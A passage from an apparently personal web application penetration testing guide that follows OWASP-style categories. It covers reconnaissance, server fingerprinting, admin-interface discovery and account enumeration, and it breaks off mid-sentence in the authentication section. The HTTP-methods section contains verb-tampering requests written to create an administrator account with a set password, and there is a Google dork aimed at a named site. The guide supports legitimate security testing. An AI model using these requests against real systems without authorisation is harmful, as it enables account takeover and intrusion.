[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
1 
 
 
Contents 
Information Gathering .................................................................................................................................. 4 
1. 
Conduct Search Engine Discovery and Reconnaissance for Information Leakage .......................... 4 
2. 
Fingerprint Web Server ..................................................................................................................... 5 
3. 
Review Webserver Metafiles for Information Leakage .................................................................... 7 
4. 
Enumerate Applications on Webserver ............................................................................................. 8 
5. 
Review Webpage Comments and Metadata for Information Leakage ........................................... 11 
6. 
Identify Application Entry Points ................................................................................................... 11 
7. 
Map execution paths through application ....................................................................................... 13 
8. 
Fingerprint Web Application & Web Application Framework ...................................................... 14 
Configuration and Deployment Management Testing ................................................................................ 18 
1. 
Test Network/Infrastructure Configuration..................................................................................... 18 
2. 
Test Application Platform Configuration........................................................................................ 23 
3. 
Test File Extensions Handling for Sensitive Information ............................................................... 29 
4. 
Review Old, Backup and Unreferenced Files for Sensitive Information ........................................ 32 
5. 
Enumerate Infrastructure and Application Admin Interfaces ......................................................... 34 
6. 
Test HTTP Methods ........................................................................................................................ 39 
7. 
Test HTTP Strict Transport Security .............................................................................................. 41 
8. 
Test RIA cross domain policy ......................................................................................................... 43 
Identity Management Testing ..................................................................................................................... 45 
1. 
Test Role Definition ........................................................................................................................ 45 
2. 
Test User Registration Process ....................................................................................................... 47 
3. 
Test Account Provisioning Process ................................................................................................. 49 
4. 
Testing for Account Enumeration and Guessable User Account .................................................... 51 Web Application Penetration Web Application Penetration Testing Testing
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
2 
 
Authentication Testing ................................................................................................................................ 56 
1. 
Testing for Credentials Transported over an Encrypted Channel ................................................... 56 
2. 
Testing for default credentials ......................................................................................................... 59 
3. 
Testing for Weak lock out mechanism ........................................................................................... 62 
4. 
Testing for bypassing authentication schema ................................................................................. 68 
5. 
Test remember password functionality ........................................................................................... 73 
6. 
Testing for Browser cache weakness .............................................................................................. 75 
7. 
Testing for Weak password policy .................................................................................................. 80 
8. 
Testing for weak security Question/Answer ................................................................................... 85 
9. 
Testing for weak password change or reset function ...................................................................... 86 
Authorization Testing ................................................................................................................................. 86 
1. 
Testing Directory traversal / file include ........................................................................................ 86 
2. 
Testing for Privilege Escalation ...................................................................................................... 87 
3. 
Testing for Insecure Direct Object References ............................................................................... 90 
Session Management Testing ..................................................................................................................... 94 
1. 
Testing for Bypassing Session Management Schema ..................................................................... 94 
2. 
Testing for Cookies attributes ......................................................................................................... 96 
3. 
Testing for Session Fixation ........................................................................................................... 98 
4. 
Testing for Exposed Session Variables ......................................................................................... 100 
5. 
Testing for Cross Site Request Forgery (CSRF) ........................................................................... 101 
6. 
Testing for logout functionality .................................................................................................... 104 
7. 
Test Session Timeout .................................................................................................................... 106 
Input Validation Testing ........................................................................................................................... 108 
1. 
Testing for Reflected Cross Site Scripting .................................................................................... 108 
2. 
Testing for Stored Cross Site Scripting ......................................................................................... 113 
3. 
Testing for HTTP Verb Tampering .............................................................................................. 117 
4. 
Testing for HTTP Parameter pollution ......................................................................................... 117 
5. 
Testing for SQL Injection ............................................................................................................. 121 
6. 
Testing for LDAP Injection .......................................................................................................... 134 
7. 
Testing for XML Injection ............................................................................................................ 136 
8. 
Testing for XPath Injection ........................................................................................................... 139 
9. 
Testing for Code Injection ............................................................................................................ 140 
10. 
Testing for Command Injection ................................................................................................ 142 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
3 
 
Testing for Error Handling ........................................................................................................................ 143 
1. 
Analysis of Error Codes ................................................................................................................ 143 
2. 
Analysis of Stack Traces ............................................................................................................... 146 
Testing for weak Cryptography ................................................................................................................ 147 
1. 
SSL/TLS Testing .......................................................................................................................... 147 
2. 
Testing for Padding Oracle ........................................................................................................... 153 
Business Testing Logic ............................................................................................................................. 157 
1. 
Test Business Logic Data Validation ............................................................................................ 157 
2. 
Test Ability to Forge Requests...................................................................................................... 159 
3. 
Test Integrity Checks .................................................................................................................... 159 
4. 
Test for Process Timing ................................................................................................................ 162 
5. 
Test Defense Against Application Misuse .................................................................................... 162 
6. 
Test Upload of Unexpected File Types ......................................................................................... 162 
7. 
Test Upload of Malicious Files ..................................................................................................... 170 
Client Side Testing .................................................................................................................................... 172 
1. 
Testing for Client Side URL Redirect ........................................................................................... 172 
2. 
Testing for Clickjacking................................................................................................................ 175 
3. 
Test Cross Origin Resource Sharing ............................................................................................. 177 
4. 
Testing for Spoofable Client IP address ....................................................................................... 177 
 
  
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
4 
 
Information Gathering 
1. Conduct Search Engine Discovery and Reconnaissance for Information Leakage 
Google hacking technique 
Evident: 
With: testphp.vulnweb.com 
I have try google hack with search field parameter as: “site: testphp.vulnweb.com” 
After this, I got basic crawling result below: 
 
I used some query to discovering more interested information : 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
5 
 
 
References: 
 
http://www.mrjoeyjohnson.com/Google.Hacking.Filters.pdf 
2. Fingerprint Web Server 
Web server fingerprinting is a critical task for the Penetration tester. Knowing the version and type of a 
running web server allows testers to determine known vulnerabilities and the appropriate exploits to use 
during testing. 
Black box test: 
The simplest and most basic form of identify a web server is look at the server field in the HTTP response 
header with netcat 
Example: 
nc google.com 80 
GET / HTTP/1.1 
Host: google.com 
enter 
enter 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
6 
 
 
Automate Testing tools: httprint, Burpsuite 
Online Testing: https://www.netcraft.com/ 
Evident: 
 
with netcat, we have result as below: 
 
 
Of course, we can use some extension of browser, such as: 
 
 
Online solutions: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
7 
 
 
References: 
 
http://www.terminally-incoherent.com/blog/2007/08/07/few-useful-netcat-tricks/ 
 
https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf 
 
http://netcat.sourceforge.net.  
 
https://www.darknet.org.uk/2007/09/httprint-v301-web-server-fingerprinting-tool-download/ 
 
http://www.net-square.com/httprint.html 
3. Review Webserver Metafiles for Information Leakage 
How to test: 
a. Robots.txt 
Web spiders/robots/crawlers retrieve (access) a web page and then recursively traverse hyperlinks to 
retrieve further web content. Their accepted behavior is specified by the Robots Exclusion Protocol of the 
robots.txt file in the web root directory 
Example: abc.com/robots.txt 
Tool: 
 
Using wget: 
o Example: wget http://google.com/robots.txt 
References: 
 
http://www.robotstxt.org/ 
Evident: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
8 
 
http://local/mutillidae/robots.txt 
 
b. META Tag 
Tags are located within the HEAD section of each HTML Document and should be consistent across a 
web site in the likely event that the robot/spider/crawler start point does not begin from a document link 
other than webroot 
Web spiders/robots/crawlers can intentionally ignore the “<META NAME=”ROBOTS”>” tag as the 
robots.txt file 
Tool: BurpSuite 
 
4. Enumerate Applications on Webserver 
Base URLs: 
 
http://www.example.com/webmail 
 
http://mail.example.com/ 
Base ports: 
Most basic and the simplest way is using port scanner such as nmap with this options. For example 
below: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
9 
 
nmap -sT -sV -p 0-65535 192.168.1.1 
Base Domain name: 
 
There are a number of techniques which may be used to idnetify DNS names to given IP, Which 
one 
is 
nslookup. 
 
 
cmd 
nslookup 
all 
set type=all 
example.com 
 
Web-based DNS search: 
o http://searchdns.netcraft.com/?host 
 
Reverse IP: 
o Domain tools reverse IP: http://www.domaintools.com/reverse-ip/ (require free 
membership) 
o MSN search: http://search.msn.com syntax: "ip:x.x.x.x" (without the quotes) 
o webhosting info: http://whois.webhosting.info/  
o DNSstuff: http://www.dnsstuff.com/ 
Google hack 
Evident: 
 
Example with nmap: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
10 
 
 
 
Example with nslookup: 
 
Tools: 
 
nslookup, dig 
 
Port scanner: nmap http://www.insecure.org 
 
Nessus Vulnerability Scanner. http://www.nessus.org 
 
Search engine: shodan.io, google. 
Note for shodan.io: //null 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
11 
 
5. Review Webpage Comments and Metadata for Information Leakage 
It is very common, and even recommended, for programmers to include detailed comments and metadata 
on their source code. However, comments and metadata included into the HTML code 
might 
reveal 
internal information that should not be available to potential attackers. Comments and metadata review 
should be done  in order to determine if any information is being  leaked. 
Tools: 
 
Wget 
 
Any browser 
 
6. Identify Application Entry Points 
In request: 
 
Identify where GETs are used and where POST are use 
 
Identify ALL parameters used in POST request (including hidden parameter and unhidden 
parameter) 
 
Identify ALL parameters used in GET request (usually after ? mark) 
 
Identify all parameters of query string 
 
Pay attention for parameters even if encoded or encrypted and identify which ones account who 
are process by application. 
In response: 
 
Identify and note any headers 
 
Identify where there are any redirects (300 HTTP status code), 400 status code, 403 particular 
forbidden and 500 internal server errors during normal response. 
Tools: 
 
Intercept proxy: Burpsuite, paros, webscarab,… 
 
Browser plugins: Tamper data on firefox,… 
Some note: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
12 
 
 
To discovering hidden parameters, I can use Burp Suite with following options: 
 
 
 
 
With status code, using Burpsuite to find’em out 
 
 
Capture request parameters and response header with Burp Suite 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
13 
 
 
7. Map execution paths through application 
Before commencing security testing, understanding the structure of the application is paramount. Without 
a thorough understanding of the layout of the application, it is unlikely that it will be tested thoroughly 
Test objectives 
 
Map the target application and understand the principal workflows 
Automatic Spider tools 
 
Burp Suite 
 
ZAP 
Automate Spider example 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
14 
 
 
8. Fingerprint Web Application & Web Application Framework 
Web framework fingerprinting is an important subtask of the information gathering process. Knowing the 
type of framework can automatically give a great advantage if such a framework has already been tested 
by the penetration tester. It is not only the known vulnerabilities in unpatched version but specific 
misconfigurations in the framework and known file structure that makes the fingerprinting process so 
important. 
Black Box Testing 
There are several most common locations to look in in order to define the current framework 
 
HTTP headers 
 
Cookies 
 
HTML source code 
 
Specific files and folders 
HTTP headers 
The most basic form of identifying a web application framework is to look at the X-Powered-By field in 
the HTTP response header. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
15 
 
 
Cookies 
Another similar and somehow more reliable way to determine the current web framework are framework-
specific cookies. 
 
HTML source code 
This technique is based on finding certain patterns in the HTML page source code. We can find a lot of 
information which helps a tester to recognize a specific web application. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
16 
 
Specific files and folders 
Every application has its own specific file and folder structure on the server. We can use tool or manual 
access them. 
Dirbusting example 
 
Google hacking technique 
https://www.exploit-db.com/ghdb/4675/ 
 
 
BurpSuite Intruder 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
17 
 
 
Common Application Identifiers 
 
 
Nikto 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
18 
 
 
Whatweb 
 
 
Configuration and Deployment Management Testing 
1. Test Network/Infrastructure Configuration 
Review of the Application Architecture 
Known Server Vulnerabilities 
 
Using Nessus Scan for Metasploitable 2, we have some Known vulnerabilities as shown below: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
19 
 
 
Administrative Tools 
 
List all the possible administrative interfaces such as: 
Local remote 
 
 
Remote access via SFTP 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
20 
 
 
 
 
Access via web interface – such as HTTP basic authentication 
Access via WebDAV 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
21 
 
Access via FTP 
 
Access via SSH 
 
 
Determine if administrative interfaces are available from an internal network or are also available 
from the internet. If available from the internet, determine the mechanisms that control access to 
these interface and their associated susceptibilities. 
 
With insecure protocol like ftp, telnet or http basic authentication, easy to sniff administrator 
password with Wireshark 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
22 
 
 
Worse, WebDAV don’t request username and password from client to identifying, so hacker can 
upload any malicious files him want. 
 
Recommend using Secure protocol such as: FTPs, SFTP, SSH, TLS/SSL,VPN,… 
 
Change default user & password 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
23 
 
2. Test Application Platform Configuration 
Configuration review and testing is a critical task, while the typical web and application server installation 
will spot a lot of function (like application examples, documentation, test pages), what is not essential 
should be removed before deployment to avoid post install exploitation. 
Black Box Testing and Example 
Sample/known Files and Directory 
Many web servers and application servers provide, in a default installation, sample applications and files 
that are provided for the benefit of the developer and in order to test that the server is working properly 
right after installation. 
However, many default web server applications have been later known to be vulnerable or information 
disclosure. 
Example: 
 
Wordpress version show in readme 
 
 
Brute force attack / Denial of Service attack in Wordpress’s xmlrpc.php 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
24 
 
 
 
More information at: 
https://isc.sans.edu/diary/Wordpress+%22Pingback%22+DDoS+Attacks/17801 
https://hackerone.com/reports/96294 
https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/blob/master/wordpress-
xmlrpc-brute-v2.py 
https://testpurposes.net/2016/11/01/wordpress-xmlrpc-brute-force-attacks-via-burpsuite/ 
Comment on source code review 
It is very common and even recommended 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
25 
 
Configuration review 
Some common guidelines should be taken into account: 
 
Only enable server modules that are needed for application. 
 
Handle server errors code with custom-made pages. 
 
Make sure server software runs with minimize privileges in the operating system. 
 
 
Make sure the server software logs properly both legitimate access and errors. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
26 
 
 
 
Make sure that the server is configured to properly handle overloads and prevent Denial of 
Service attacks. 
Logging 
Logging is an important asset of the security of an application architecture, since it can be used to detect 
flaws in application, logs are typically properly generated by web and server software. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
27 
 
 
Sensitive information in logs 
Some applications might, for example use GET requests to forward form data which will be viewable in 
the server logs. This means that server logs might contain sensitive information (such as usernames as 
passwords, or bank account details). This sensitive information can be misused by an attacker if logs were 
to be obtained by an attacker, for example, through administrative interfaces or known web server 
vulnerabilities or misconfiguration (like the well-known server-status misconfiguration in Apache-based 
HTTP servers ).   
Log Location 
Try to keep logs in a separate location, and not in the web server itself. This also makes it easier to 
aggregate logs from different sources that refer to the same application (such as those of a web server 
farm) and it also makes it easier to do log analysis (which can be CPU intensive) without affecting the 
server itself. 
Log Storage 
In UNIX systems, logs will be located in /var (although some server installations might reside in /opt or 
/usr/local) and it is thus important to make sure that the directories that contain logs are in a separate 
partition. In some cases, and in order to prevent the system logs from being affected, the log directory of 
the server software itself (such as /var/log/apache in the Apache web server) should be stored in a 
dedicated partition. 
Log rotation  
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
28 
 
Most servers (but few custom applications) will rotate logs in order to prevent them from filling up the 
file system they reside on. The assumption when rotating logs is that the information in them is only 
necessary for a limited amount of time.   
This feature should be tested in order to ensure that:   
 
Logs are kept for the time defined in the security policy, not more and not less.   
 
Logs are compressed once rotated (this is a convenience, since it will mean that more logs will be 
stored for the same available disk space)   
 
File system permission of rotated log files are the same (or stricter) that those of the log files 
itself. For example, web servers will need to write to the logs they use but they don’t actually 
need to write to rotated logs, which means that the permissions of the files can be changed upon 
rotation to prevent the web server process from modifying these.   
Some servers might rotate logs when they reach a given size. If this happens, it must be ensured that an 
attacker cannot force logs to rotate in order to hide its tracks. 
Log contents 
 
Do the logs contain sensitive information? 
 
Are the logs stored in a dedicated server? 
 
Can log usage generate a Denial of Service condition? 
 
How are log backups preserved? 
 
Is the data being logged data validated (min/max length, chars etc) prior to being logged? 
 
How are logs reviewed? Can admin use these review to detect targeted attack? 
 
How are they rotated ? are logs kept for the sufficient time? 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
29 
 
 
3. Test File Extensions Handling for Sensitive Information 
File extensions are commonly used in web servers to easily determine which technologies / languages / 
plugins must be used to fulfill the web request. 
Black box testing: 
Submit http[s] requests involving different file extensions and verify how they are handled. These 
verifications should be on a per web directory basis.   
The following file extensions should NEVER be returned by a web server, since they are related to files 
which may contain sensitive information, or to files for which there is no reason to be served.   
 
.asa   
 
.inc 
Using google hack, easy to find them, such as: 
 
ext:asa inurl:www.maybole.org 
 
The following file extensions are related to files which, when accessed, are either displayed or 
downloaded by the browser. Therefore, files with these extensions must be checked to verify that they are 
indeed supposed to be served (and are not leftovers), and that they do not contain sensitive information. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
30 
 
 
.zip, .tar, .gz, .tgz, .rar, ...: (Compressed) archive files   
 
.java: No reason to provide access to Java source files   
 
.txt: Text files   
 
.pdf: PDF documents 
 
.doc, .rtf, .xls, .ppt, ...: Office documents   
 
.bak, .old and other extensions indicative of backup files (for example: ~ for Emacs backup files)   
For more information, access to this link: http://filext.com/ 
We can mix some below techniques for solving this problem: 
 
Vulnerability scanner 
 
 
 
Spider tools 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
31 
 
 
 
 
 
Mirroring tools 
 
 
Manual access 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
32 
 
Gray box testing 
Performing white box testing against file extensions handling amounts to checking the configurations of 
web server(s) / application server(s) taking part in the web application architecture, and verifying how 
they are instructed to serve different file extensions. If the web application relies on a load-balanced, 
heterogeneous infrastructure, determine whether this may introduce different behaviour.   
4. Review Old, Backup and Unreferenced Files for Sensitive Information 
While most of the files within a web server are directly handled by the server itself it isn't uncommon to 
find unreferenced and/or forgotten files that can be used to obtain important information about either the 
infrastructure or the credentials. Most common scenarios include the presence of renamed old version of 
modified files, inclusion files that are loaded into the language of choice and can be downloaded as 
source, or even automatic or manual backups in form of compressed archives. All these files may grant 
the pentester access to inner workings, backdoors, administrative interfaces, or even credentials to 
connect to the administrative interface or the database server.   
Black Box Testing 
Testing for unreferenced files uses both automated and manual techniques: 
 
Enumerate all of application’s pages and functionality: This can be done manually using a 
browser, or using an application spidering tool. Most applications use a recognisable naming 
scheme, and organise resources into pages and directories using words that describe their 
function. From the naming scheme used for published content, it is often possible to infer the 
name and location of unreferenced pages. For example, if a page viewuser.asp is found, then look 
also for edituser.asp, adduser.asp and deleteuser.asp. If a directory /app/user is found, then look 
also for /app/admin and /app/manager. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
33 
 
 
Other clues in published content: Many web applications leave clues in published content that can 
lead to the discovery of hidden pages and functionality. These clues often appear in the source 
code of HTML and JavaScript files. The source code for all published content should be manually 
reviewed to identify clues about other pages and functionality. 
 
Another source of clues about unreferenced directories is the /robots.txt file used to provide 
instructions to web robots. 
 
 
Information obtained through server vulnerabilities and misconfiguration 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
34 
 
 
 
Use of publicly available information: google hack, shodan.io 
5. Enumerate Infrastructure and Application Admin Interfaces 
Black box and Gray box Testing 
The following describes vectors that may be used to test for the presence of administrative interfaces. 
These techniques may also be used for testing for related issues including privilege escalation and are 
described elsewhere in this guide in greater detail: 
 
Directory and file Enumeration - An administrative interface may be present but not visibly 
available to the tester. Attempting to guess the path of the administrative interface may be as 
simple as requesting: /admin or /administrator etc.. A tester may have to also identify the 
filename of the administration page. Forcibly browsing to the identified page may provide access 
to the interface. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
35 
 
 
Comments and links in Source - Many sites use common code that is loaded for all site users. By 
examining all source sent to the client, links to administrator functionality may be discovered and 
should be investigated. 
 
 
 
Reviewing Server and Application Documentation - If the application server or application is 
deployed in its default configuration it may be possible to access the administration interface 
using information described in configuration or help documentation. Default password lists 
should be consulted if an administrative interface is found and credentials are required. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
36 
 
 
 
 
 
Alternative Server Port - Administration interfaces may be seen on a different port on the host 
than the main application. For example, Apache Tomcat's Administration interface can often be 
seen on port 8080. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
37 
 
 
 
 
Parameter Tampering - A GET or POST parameter or a cookie variable may be required to enable 
the administrator functionality. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
38 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
39 
 
 
6. Test HTTP Methods 
HTTP offers a number of methods that can be used to perform actions on the web server. Many of theses 
methods are designed to aid developers in deploying and testing HTTP applications. 
While GET and POST are by far the most common methods that are used to access information provided 
by a web server, the Hypertext Transfer Protocol (HTTP) allows several other (and somewhat less 
known) methods: 
 
HEAD   
 
GET   
 
POST   
 
PUT   
 
DELETE   
 
TRACE   
 
OPTIONS   
 
CONNECT 
Some of these methods can potentially pose a security risk for a web application, as they allow an attacker 
to modify the files stored on the web server and, in some scenarios, steal the credentials of legitimate 
users. More specifically, the methods that should be disabled are the following:   
 
PUT: This method allows a client to upload new files on the web server. An attacker can exploit 
it by uploading malicious files (e.g.: an asp file that executes commands by invoking cmd.exe), or 
by simply using the victim server as a file repository   
 
DELETE: This method allows a client to delete a file on the web server. An attacker can exploit it 
as a very simple and direct way to deface a web site or to mount a DoS attack   
 
CONNECT: This method could allow a client to use the web server as a proxy   
 
TRACE: This method simply echoes back to the client whatever string has been sent to the 
server, and  is used mainly for debugging purposes. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
40 
 
Black Box Testing 
Discover the Supported Methods 
 
Test XST Potential 
 
Find a page you'd like to visit that has a security constraint such that it would normally force a 302 
redirect to a login page or forces a login directly. The test URL in this example works like this - as do 
many web applications. However, if you obtain a "200" response that is not a login page, it is possible to 
bypass authentication and thus authorization. 
www.example.com 80 JEFF / HTTP/1.1 Host: www.example.com  
HTTP/1.1 200 OK  
Date: Mon, 18 Aug 2008 22:38:40 GMT  
Server: Apache  
Set-Cookie: PHPSESSID=K53QW...  
If your framework or firewall or application does not support the "JEFF" method, it should issue an error 
page (or preferably a 405 Not Allowed or 501 Not implemented error page). If it services the request, it is 
vulnerable to this issue.   
If you feel that the system is vulnerable to this issue, issue CSRF-like attacks to exploit the issue more 
fully:   
 
FOOBAR /admin/createUser.php?member=myAdmin   
 
JEFF /admin/changePw.php?member=myAdmin&passwd=foo123&confirm=foo123   
 
CATS /admin/groupEdit.php?group=Admins&member=myAdmin&action=add  
 
HEAD /admin/createUser.php?member=myAdmin 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
41 
 
With some luck, using the above three commands - modified to suit the application under test and testing 
requirements - a new user would be created, a password assigned, and made an admin. 
7. Test HTTP Strict Transport Security 
The HTTP Strict Transport Security (HSTS) header is a mechanism that web sites have to communicate 
to the web browsers that  all traffic exchanged with a given domain must always be sent over https. 
Considering the importance of this security measure it is important to verify that the web site is using this 
HTTP header, in order to ensure that all the data travels encrypted from the web browser to the server. 
The HTTP Strict Transport Security (HSTS) feature lets a web application to inform the browser, through 
the use of a special response header, that it should never establish a connection to the specified domain 
servers using HTTP. Instead it should automatically establish all connection requests to access the site 
through HTTPS. 
The HTTP strict transport security header uses two directives: 
 
max-age: to indicate the number of seconds that the browser should automatically convert all 
HTTP requests to HTTPS. 
 
includeSubDomains: to indicate that all web application’s sub-domains must use HTTPS. 
Here's an example of the HSTS header implementation: 
 
Strict-Transport-Security: max-age=60000; 
includeSubDomains 
The use of this header by web applications must be checked to find if the following security issues could 
be produced: 
 
Attackers sniffing the network traffic and accessing the information transferred through an 
unencrypted channel.  
 
 
Attackers exploiting a man in the middle attack because of the problem of accepting certificates 
that are not trusted.  
 
Users who mistakenly entered an address in the browser putting HTTP instead of HTTPS, or 
users who click on  a link in a web application which mistakenly indicated the http protocol. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
42 
 
 
 
How to test 
 
I have wrote a tool which can analyze header, contact to me to get this tool for free. 
 
 
Burpsuite response 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
43 
 
 
8. Test RIA cross domain policy 
RIAs are web-based services that perform the same functions as desktop application systems. 
A cross-domain  policy file specifies the permissions that a web client such as Java, Adobe Flash, Adobe 
Reader, etc. use to access data across different domains. For Silverlight, Microsoft adopted a subset of the 
Adobe's  crossdomain.xml, and additionally created it's own cross-domain policy file: 
clientaccesspolicy.xml. 
Whenever a web client detects that a resource has to be requested from other domain, it will first look for 
a policy file in the target domain to determine if performing cross-domain  requests, including headers, and 
socket-based connections are allowed. 
Master policy files are located at the domain's root. A client may be instructed to 
load 
a 
different 
policy file but it will always check the master policy file first to ensure that the master policy file permits 
the requested policy file. 
How to Test 
We should try to retrieve the policy files crossdomain.xml and clientaccesspolicy.xml from the 
application’s root and from every folder found. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
44 
 
 
After retrieving all the policy files, the permissions allowed should be checked under the least 
privilege 
principle. Requests should only come from the domains, ports, or protocols that are necessary. Overly 
permissive policies should be avoided. Policies with "*" in them should be closely examined. 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
45 
 
Identity Management Testing 
1. Test Role Definition 
Test objectives 
Validate the system roles defined within the application sufficiently define and separate each system and 
business role to manage appropriate access to system function and information 
How to test 
Either with or without the help of the system dev or admin, develop an role versus permission matrix. The 
matrix will show and enumerate all the roles that can be provisioned and explore the permissions that are 
allowed to be applied to the objects including any constraints. 
Example 
In real world, I have pentested many wordpress site, example of role definitions in wordpress can be 
found at shown below link 
 
https://codex.wordpress.org/Roles_and_Capabilities 
Tools 
 
You can approach this problem by manual test 
 
Spidering tools (Burp Suite) – Log on with each role in turn and spider the application (don’t 
forget to exclude the logout button/link from the spidering) 
With admin account, using spider option we have this below result and save this state to file 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
46 
 
 
With normal user account, we also use spider option and get following result 
 
Finally, use compare function to comparing two site map we’ve got 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
47 
 
 
2. Test User Registration Process 
Test Objectives 
 
Verify that the identity requirements for user registration are aligned with business and security 
requirements 
 
Validate the registration process 
How to Test 
Test list 
 
Determine who can register for access (anyone)? 
 
Are registrations are vetted by a human prior to provisioning or are they automatically granted if 
the criteria are met. 
 
Can the same person register multiple times? 
 
Can user register for different roles or permissions? 
 
What proof of identity is required for a registration to be successful? 
 
Are registered identities verified? 
 
Can identity information be easily forged or faked? 
 
Can the exchange of identity information be manipulated during registration process? 
Tools 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
48 
 
 
Manual test 
 
HTTP proxy (Burp Suite, ZAP) 
Example 
In the wordpress example below, the only identification requirement is an email address that is accessible 
to the registrant. 
 
In the Google example below, the identification requirements include name, date of birth, country, mobile 
phone number and two of the can be verified (Email and mobile phone number). 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
49 
 
 
3. Test Account Provisioning Process 
Test Objective 
Verify which account may provision other account and of what type 
How to test 
Test List 
 
Is there any verification, vetting and authorization of provisioning requests? 
 
Is there any verification, vetting and authorization of de-provisioning requests?  
 
Can an administrator provision other administrators or just users?  
 
Can an administrator or other user provision accounts with privileges greater than their own?  
Can an administrator or  user de-provision themselves?  
 
How are the files or resources owned by the de-provisioned user  managed? Are they deleted? Is 
access transferred 
Example 
In WordPress, only a user’s name and email address are required to provision the user, as shown below 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
50 
 
 
De-provisioning of users requires the admin to select the user to be de-provisioned, select delete from the 
dropdown menu and applying this action. The administrator is then presented with a dialog box asking 
what to do with the de-provisioning user’s post (delete or transfer them). 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
51 
 
4. Testing for Account Enumeration and Guessable User Account 
Black box Testing 
In this case, the tester knows nothing about the specific application, username, application logic, error 
messages on log in page, or password recovery facilities. If application is vulnerable, the tester receives a 
response message that reveals, directly or indirectly, some information useful for enumerating users. 
HTTP Response message 
 
Test for valid user with wrong password 
 
 
 
Test for a nonexistent username 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
52 
 
 
Another way to enumerate users 
 
Analyzing the error code received on login page 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
53 
 
 
 
 
Analyzing URLs and URLs re-directions 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
54 
 
 
 
Analyzing a message received from a another authentication function (recovery, reset pass, register) 
 
Reset password function example 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
55 
 
 
Guessing Users 
In some cases the user IDs are created with specific policies of administration or company, such as: 
 
Tools: 
 
Manual test 
 
Automate tools such as: WordPress enumeration username tools like wpscan 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
56 
 
 
 
 
Authentication Testing 
1. Testing for Credentials Transported over an Encrypted Channel 
Black Box Testing 
In the following examples we will use Burp Suite to capture packet headers and to inspect the them 
Example 1: Sending data with GET/POST method through HTTP 
Suppose that the login page presents a form with field User, Pass, and the Submit button to authenticate 
and give access to application. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
57 
 
 
 
So the data is transmitted without encryption and a malicious user could intercept the username and 
password by simple sniffing the network with a tool like Wireshark 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
58 
 
 
Example 2: Sending data with GET/POST method through HTTPS 
Suppose that our web application uses the HTTPS protocol to encrypt the data we are sending (or at least 
for transmitting sensitive data like credentials). In this case, when logging on to the web application the 
header of our POST request would be similar to the following: 
 
Example 3: sending data with GET/POST method via HTTPS on a page reachable via HTTP 
Imagine we having a web page reachable via HTTP and that only data sent from the authentication form 
are transmitted via HTTPS 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
59 
 
 
We can see that our request is addressed to www.example.com/login using HTTPS. But if we have a look 
at the Referer-header (the page from which we came), it is www.example.com/ And is accessible via 
simple HTTP. Although we are sending data via  HTTPS, this deployment can allow SSLStrip attacks (a 
type of Man-in-the-middle attack) 
 
You can see that the data is transferred in clear text in the URL and not in the body of the request.  But we 
must consider that SSL/TLS is a  level 5 protocol, a lower level than HTTP, so the whole HTTP packet is 
